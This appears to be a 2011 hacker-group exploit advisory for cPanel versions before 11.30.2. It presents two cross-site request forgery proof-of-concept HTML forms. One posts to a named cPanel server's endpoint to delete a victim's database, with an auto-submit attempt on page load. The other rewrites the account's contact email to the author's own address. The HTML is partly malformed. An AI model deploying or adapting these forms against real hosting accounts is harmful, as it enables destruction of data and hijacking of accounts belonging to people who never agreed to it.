__________.__                 __               ___ ___
\______   \  | _____    ____ |  | __          /   |   \  ____
 |    |  _/  | \__  \ _/ ___\|  |/ /  ______ /    ~    \/ ___\
 |    |   \  |__/ __ \\  \___|    <  /_____/ \    Y    / /_/  >
 |______  /____(____  /\___  >__|_ \          \___|_  /\___  /
        \/          \/     \/     \/                \//_____/
                                                               .ORG

[+] Info=================================================================

 [-] Exploit Title: cPanel < 11.30.2 Multiple CSRF Vulnerabilities
 [-] Author: Net.Edit0r
 [-] Home : Black-HG.Org ~ h4ckcity.org
 [-] Version: 11.30.2
 [-] Software Link: http://cpanel.net
 [-] Email : Black.hat.tm[at]Gmail[dot]Com / Net.Edit0r[at]att[dot]net
 [-] Date : 27/08/2011
 [-] CVE : N/A
 [-] Vedio Demo : http://www.black-hg.org/Vedioz/cpanel.rar
 [-] Tnx2 : A.Cr0x & 3H34N & 4m!n & Cyrus & tHe.k!ll3r & Mr.XHat & Mikili

[+] Exploit===============================================================


 [-]  Introduction :

cPanel versions below and excluding 11.30.2 , are vulnerable to CSRF which
leads to Change email address script of the attackers liking. If you have turned
off security tokens and referrer security check, no matter what version you
are using, you are vulnerable as well.

Note: You can use this vulnerability to do intelligent

 [-]  Remote Delete Database

<html>
<head>
<body>
<title>Coded By #BHG</title>
<form method="post"
action="https://www.downloadpars.ir:2083/cpsess1461226313/frontend/x3/sql/deldb.html"
name="mainform" id="mainform">
		<h4>Delete Database</h4>
		<div class="highlight">
		<table cellpadding="3" cellspacing="0">
	<tr>
		<td><label for="dbname">Victim Database:</label></td>
		<td><input type="text" name="db" id="dbname" style="width: 150px" /></td>
		</tr>
	<td> </td>
                <td><center><input type="submit" id="submit_dbname"
value="Delete Database" class="input-button" /></center></td>
                <body onload="document.forms.g.submit();">
	<td></td>
		</tr>
		</table>
		</div>
	</form>
</div>
</body>
</html>


 [-]  Remote Change Cpanel Mail


<html>
<head>
<body>
<title>Coded By #BHG</title>
<form id="mainform" name="mainform"
action="https://www.downloadpars.ir:2083/cpsess8033607818/frontend/x3/contact/saveemail.html?email=">
<ul class="contact_form">

        <li class="contact_label">Chenge New Email Address</li>
        <li class="contact_input brd"><input id="email" name="email"
type="text" checked="checked" value="net.edit0r@gmail.com" size="40"
/></li>
        <li class="contact_label">The second address to receive
notifications</li>
        <li class="contact_input brd"><input id="second_email"
name="second_email" type="text" checked="checked" value="" size="40"
/></li>

		<li><strong>Contact Preferences</strong></li>


        <li class="contact_input"><input id="notify_disk_limit"
name="notify_disk_limit" type="checkbox" checked="checked" value="1"
size="40" />Send notifications to your contact email address when you
are reaching your disk quota.</li>
	
        <li class="contact_input"><input id="notify_bandwidth_limit"
name="notify_bandwidth_limit" type="checkbox" checked="checked"
value="1" size="40" />Send notifications to your contact email address
when you are reaching your bandwidth usage limit.</li>
	
        <li class="contact_input"><input id="notify_email_quota_limit"
name="notify_email_quota_limit" type="checkbox" checked="checked"
value="1" size="40" />Send notifications to your contact email address
when one of your email accounts approaches or is over quota.</li>


	<input style="margin-top:10px" type="submit" id="submit-button"
class="input-button" value="Save"></div></li>

</ul>
<br />

</form>
</div>
</body>
</html>
